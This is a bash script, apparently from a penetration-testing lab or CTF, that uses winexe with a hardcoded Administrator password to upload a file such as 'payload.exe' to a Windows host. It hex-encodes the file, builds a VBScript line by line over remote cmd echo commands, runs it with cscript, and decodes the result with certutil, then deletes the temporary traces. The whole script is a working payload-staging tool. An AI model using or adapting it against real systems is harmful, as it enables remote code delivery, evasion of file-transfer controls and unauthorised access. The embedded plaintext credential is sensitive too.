#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <local_file> <remote_path>"
    echo "Example: $0 payload.exe C:\\Windows\\Temp\\file.exe"
    exit 1
fi

LOCAL_FILE="$1"
REMOTE_PATH="$2"

# Ensure local file exists
if [ ! -f "$LOCAL_FILE" ]; then
    echo "Error: Local file '$LOCAL_FILE' not found"
    exit 1
fi

WINEXE_CMD="runc exec winexe-container ./winexe-static-2 -U Administrator%Cheesed2MeetU! //10.100.136.132"
TEMP_HEX="${REMOTE_PATH}.hex"
TEMP_VBS="${REMOTE_PATH}.vbs"

# Clear any existing files
$WINEXE_CMD "cmd /c del $TEMP_HEX 2>nul"
$WINEXE_CMD "cmd /c del $TEMP_VBS 2>nul"
$WINEXE_CMD "cmd /c del $REMOTE_PATH 2>nul"

# Create local hex file
echo "Creating hex dump..."
xxd -p "$LOCAL_FILE" > local_hex.txt
local_size=$(wc -c < local_hex.txt)
echo "Local hex size: $local_size bytes"

# Create VBS script to write hex data
echo "Creating VBS writer..."
echo 'Const ForWriting = 2' > local_vbs.txt
echo 'Set fso = CreateObject("Scripting.FileSystemObject")' >> local_vbs.txt
echo "Set f = fso.OpenTextFile(\"$TEMP_HEX\", ForWriting, True)" >> local_vbs.txt

# Split hex into manageable lines
split -l 100 local_hex.txt chunk_
for chunk in chunk_*; do
    data=$(cat "$chunk" | tr -d '\n\r')
    echo "f.Write \"$data\"" >> local_vbs.txt
done

echo 'f.Close' >> local_vbs.txt

# Transfer VBS script
echo "Transferring VBS script..."
while IFS= read -r line; do
    $WINEXE_CMD "cmd /c echo $line>> $TEMP_VBS"
done < local_vbs.txt

# Execute VBS script to write hex file
echo "Writing hex data..."
$WINEXE_CMD "cmd /c cscript //nologo $TEMP_VBS"

# Convert hex to binary
echo "Converting to binary..."
$WINEXE_CMD "cmd /c certutil -decodehex $TEMP_HEX $REMOTE_PATH"

# Clean up
$WINEXE_CMD "cmd /c del $TEMP_HEX"
$WINEXE_CMD "cmd /c del $TEMP_VBS"
rm local_hex.txt local_vbs.txt chunk_*

echo "Transfer complete. File saved to $REMOTE_PATH"
